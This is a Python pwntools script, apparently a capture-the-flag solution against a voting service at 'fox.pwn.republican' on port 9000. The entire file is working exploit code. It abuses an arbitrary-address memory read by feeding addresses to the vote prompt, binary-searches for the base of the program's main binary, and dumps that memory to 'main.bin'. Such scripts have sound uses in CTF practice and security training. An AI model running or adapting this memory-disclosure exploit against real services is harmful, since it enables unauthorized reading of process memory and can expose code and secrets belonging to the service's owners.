#!/usr/bin/python3
#

from pwn import *

class FoxPwn(remote):
    msg_fail = b"Nice try, but we won't let you vote for yourself unless you have payed your dues to the NWO."
    msg_end = b"\n[Press enter to finish voting]\n"
    main_base = None
    main = None
    
    def dumpMem(self, addr, check=True):
        dummyname = 'dummy'
        self.recvuntil('name: ')
        self.sendline(dummyname)
        self.recvuntil('for: ')
        self.sendline(dummyname)
        self.recvuntil('%s? ' % dummyname)
        self.sendline(str(addr))
        dat = self.recvuntil(self.msg_end)[:-len(self.msg_end)]
        if check and (dat == self.msg_fail):
            dat = False
        self.sendline('')
        return dat

    def lookupMain(self, a, b):
        if self.main_base:
            return self.main_base
        if (b-a)<=1:
            if self.dumpMem(a) != False:
                self.main_base = a
                return a
            else:
                self.main_base = b
                return b
        if self.dumpMem((a+b)//2) != False:
            return self.lookupMain(a, (a+b)//2)
        else:
            return self.lookupMain((a+b)//2, b)

    def dumpMain(self, until_addr):
        a = self.main_base
        total_bytes = until_addr - self.main_base
        self.main = b''
        with log.progress('dumping mem from main') as logp:
            while a < until_addr:
                chunk = self.dumpMem(a, check=False)
                self.main += chunk + b'\x00'
                a += len(chunk) + 1
                logp.status('%d/%d bytes (%.1f%%)' %
                            (len(self.main), total_bytes,
                             100*len(self.main)/total_bytes))

    def writeDump(self, filename):
        with open(filename, 'wb') as f:
            f.write(self.main)
            f.close()
            
MyFoxPwn = FoxPwn('fox.pwn.republican', 9000)

with log.progress('leaking main() base address') as logp:
    logp.success(hex(MyFoxPwn.lookupMain(0x400000, 0x402000)))

MyFoxPwn.dumpMain(0x402000-1)
#MyFoxPwn.dumpMain(MyFoxPwn.main_base+3500)
#MyFoxPwn.dumpMain(MyFoxPwn.main_base+150)

dumpfile = 'main.bin'
MyFoxPwn.writeDump(dumpfile)
log.success("mem from %s dumped to '%s'" % (hex(MyFoxPwn.main_base), dumpfile))
